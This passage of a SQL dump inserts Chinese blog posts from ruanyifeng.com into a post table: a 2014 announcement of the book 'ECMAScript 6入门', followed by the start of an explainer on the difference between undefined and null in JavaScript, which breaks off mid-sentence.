版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年5月12日 更多内容： 档案 » 开发者手册 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL),
(24, 'http://www.ruanyifeng.com/blog/2014/04/ecmascript_6_primer.html', '《ECMAScript 6入门》上线了', '<p>过去的一个月，我写了一本书<strong><a href="http://es6.ruanyifeng.com/">《ECMAScript 6入门》</a></strong>，今天上线了。</p>\n\n        <p><a href="http://es6.ruanyifeng.com/"><img alt="cover" src="http://es6.ruanyifeng.com/images/cover_thumbnail.jpg" title="" /></a></p>\n\n<p>网址：<strong><a href="http://es6.ruanyifeng.com/">es6.ruanyifeng.com</a></strong> </p>\n\n<p>ES6是JavaScript语言的下一个版本，预计将在2014年底正式发布。它对JavaScript做了大量改造，提高了灵活性和应用性，使得这门语言真正成为了企业级开发工具。</p>\n\n<p>但是，ES6也使得JavaScript变得更抽象、更难学了。我把自己过去一年的学习笔记，做成了这本书，采用创意共享开源许可证，源码放在<a href="https://github.com/ruanyf/es6tutorial">Github</a>上面。欢迎大家访问，多提宝贵意见，多发Pull Request。</p>\n\n<p>此书将伴随ES6的推广，持续修订，目标是成为最好的ES6中文教材。令人高兴的是，电子工业出版社已经接受了这部书稿，预计不久后，印刷版就可以问世。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-04-30T12:36:03+08:00">2014年4月30日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/javascript/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> JavaScript</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://memoryhere.com/?utm_source=ruanyifeng.com" style="border: none;" target="_blank">生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-10-27 02:55:25', '2014-04-30 04:36:03', 0, '[["JavaScript", 0.3391423405078014], ["ES6", 0.3391423405078014], ["2014", 0.1695711702539007], ["\\u521b\\u610f", 0.12028571138581559], ["\\u8bb8\\u53ef\\u8bc1", 0.11874111438950355], ["\\u5171\\u4eab", 0.11765780972595745], ["\\u672c\\u4e66", 0.10749095619929079], ["\\u8bb0\\u5fc6", 0.10583442951602837], ["\\u5370\\u5237\\u7248", 0.09858636632624114], ["\\u96be\\u5b66", 0.0887544914248227], ["\\u8bed\\u8a00", 0.08742549750553191], ["\\u5b9d\\u8d35\\u610f\\u89c1", 0.0871719130460993], ["\\u4f01\\u4e1a\\u7ea7", 0.0871719130460993], ["\\u751f\\u547d", 0.08702281660822694], ["\\u6e90\\u7801", 0.08587885235957447], ["ruanyifeng", 0.08478558512695035], ["twitter", 0.08478558512695035], ["ECMAScript", 0.08478558512695035], ["3.0", 0.08478558512695035], ["\\u7f51\\u662f", 0.08478558512695035]]', NULL, NULL, '过去的一个月，我写了一本书《ECMAScript 6入门》，今天上线了。\n\n        \n\n网址：es6.ruanyifeng.com \n\nES6是JavaScript语言的下一个版本，预计将在2014年底正式发布。它对JavaScript做了大量改造，提高了灵活性和应用性，使得这门语言真正成为了企业级开发工具。\n\n但是，ES6也使得JavaScript变得更抽象、更难学了。我把自己过去一年的学习笔记，做成了这本书，采用创意共享开源许可证，源码放在Github上面。欢迎大家访问，多提宝贵意见，多发Pull Request。\n\n此书将伴随ES6的推广，持续修订，目标是成为最好的ES6中文教材。令人高兴的是，电子工业出版社已经接受了这部书稿，预计不久后，印刷版就可以问世。\n\n（完）\n\n        文档信息\n\n版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证）\n发表日期： 2014年4月30日\n更多内容：  档案  » \n  JavaScript \n\n付费支持： 购买文集\n社交媒体： twitter， weibo\nFeed订阅： \n\n        \n        [广告]　生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(25, 'http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html', 'undefined与null的区别', '<p>大多数计算机语言，有且仅有一个表示"无"的值，比如，C语言的NULL，Java语言的null，Python语言的None，Ruby语言的nil。</p>\n\n        <p>有点奇怪的是，JavaScript语言居然有<strong>两个</strong>表示"无"的值：undefined和null。这是为什么？</p>\n\n<p><img alt="undefined vs. null" src="http://image.beekka.com/blog/2014/bg2014032801.png" title="" /></p>\n\n<h2>一、相似性</h2>\n\n<p>在JavaScript中，将一个变量赋值为undefined或null，老实说，几乎没区别。</p>\n\n<blockquote><pre><code class="language-javascript">\nvar a = undefined;\n\nvar a = null;\n\n</code></pre></blockquote>\n\n<p>上面代码中，a变量分别被赋值为undefined和null，这两种写法几乎等价。</p>\n\n<p>undefined和null在if语句中，都会被自动转为false，相等运算符甚至直接报告两者相等。</p>\n\n<blockquote><pre><code class="language-javascript">\nif (!undefined) \n    console.log(''undefined is false'');\n// undefined is false\n\nif (!null) \n    console.log(''null is false'');\n// null is false\n\nundefined == null\n// true\n\n</code></pre></blockquote>\n\n<p>上面代码说明，两者的行为是何等相似！</p>\n\n<p>既然undefined和null的含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加JavaScript的复杂度，令初学者困扰吗？Google公司开发的JavaScript语言的替代品Dart语言，就明确规定只有null，没有undefined！</p>\n\n<h2>二、历史原因</h2>\n\n<p>最近，我在读新书<a href="http://speakingjs.com/">《Speaking JavaScript》</a>时，意外发现了这个问题的答案！</p>\n\n<p>原来，这与JavaScript的历史有关。1995年<a href="http://www.ruanyifeng.com/blog/2011/06/birth_of_javascript.html">JavaScript诞生</a>时，最初像Java一样，只设置了null作为表示"无"的值。</p>\n\n<p>根据C语言的传统，null被设计成可以自动转为0。</p>\n\n<blockquote><pre><code class="language-javascript">\nNumber(null)\n// 0\n\n5 + null\n// 5\n\n</code></pre></blockquote>\n\n<p>但是，JavaScript的设计者Brendan Eich，觉得这样做还不够，有两个原因。</p>\n\n<p>首先，null像在Java里一样，被当成一个对象。但是，JavaScript的数据类型分成原始类型（primitive）和合成类型（complex）两大类，Brendan Eich觉得表示"无"的值最好不是对象。</p>\n\n<p>其次，JavaScript的最初版本没有包括错误处理机制，发生数据类型不匹配时，往往是自动转换类型或者默默地失败。Brendan Eich觉得，如果null自动转为0，很不容易发现错误。</p>\n\n<p>因此，Brendan 